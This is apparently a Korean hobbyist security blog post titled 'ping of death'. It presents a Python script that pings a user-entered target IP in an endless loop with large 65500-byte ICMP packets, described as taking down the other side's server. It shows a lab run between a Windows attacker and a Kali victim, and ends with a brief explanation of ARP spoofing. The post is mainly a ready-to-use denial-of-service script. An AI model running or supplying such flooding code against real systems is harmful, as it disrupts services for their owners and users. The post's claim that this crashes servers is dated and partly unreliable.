---
layout: post
title:  "ping of death"
date:   2019-08-22 21:05:15
categories: [All, SystemHacking, DoS]
---

# Ping of Death
서버의 연결 여부 응답을 회신하는 ping 명령어로 공격 

## 1. 스크립트 작성
```python 
#################2019.08.19###############
# Ping of Death
# 상대방 서버를 다운 시키는 명령어이다. 
# ping을 이용하여 ICMP 패킷을 정상적인 크기보다 크게 만들고
# 네트워크를 통해 라우팅 되어 공격 네트워크에 도달하는 동안
# 아주 작은 조각(Fragment)이 된다
# 정상적인 ping 의 경우 보다 훨씬 더 많은 부하가 걸린다. 
# -n icmp 패킷을 보내는 횟수
# -l 패킷의 크기
# -a 목표의 주소 
# 
##########################################
import os
import time

destIP = input("Enter URL address of DoS Target: ")

while(1):
	os.system("ping -n 100 -l 65500 %s" % (destIP))
	#time.sleep(5)

```

## 2. 희생자 ip 확인

공격자 (window) : 10.20.2.127 <br/>
희생자 (Kali linux) : 10.20.3.167

## 3. 스크립트 실행 

**공격자 화면** <br/>

![image](https://user-images.githubusercontent.com/46625602/63488209-1cbbbb00-c4e9-11e9-8765-088449d79d50.png)

![image](https://user-images.githubusercontent.com/46625602/63488249-48d73c00-c4e9-11e9-9f3e-2c78698245f1.png)

**희생자 화면** <br/> 

![image](https://user-images.githubusercontent.com/46625602/63488292-66a4a100-c4e9-11e9-8f7e-1303c96447bd.png)


----

ping of death 보다는 ARP 스푸핑을 이용한 공격이 훨씬 강력하다.


단, ARP 공격은 나에게로 오는 패킷을 붙잡아다 죽이는 거라.


내 컴퓨터에도 부하가 적지 않을 거 같다.

[WIKI ARP 스푸핑 설명](https://namu.wiki/w/ARP%20%EC%8A%A4%ED%91%B8%ED%95%91) <br/>
ARP 스푸핑이란 공격자가 자신이 게이트웨이라고 속이는, 원리 자체는 단순한 기법이다. <br/>그러나 이렇게 되면 당연히 피해자는 공격자에게 모든 데이터를 전송하게 된다.<br/> 공격자는 이를 원래 게이트웨이로 전송해주기만 하면 피해자는 아무런 문제점 없이 통신을 할 수 있다.<br/> 자신의 모든 정보가 노출되고 있다는 점 빼고는 말이다.<br/>
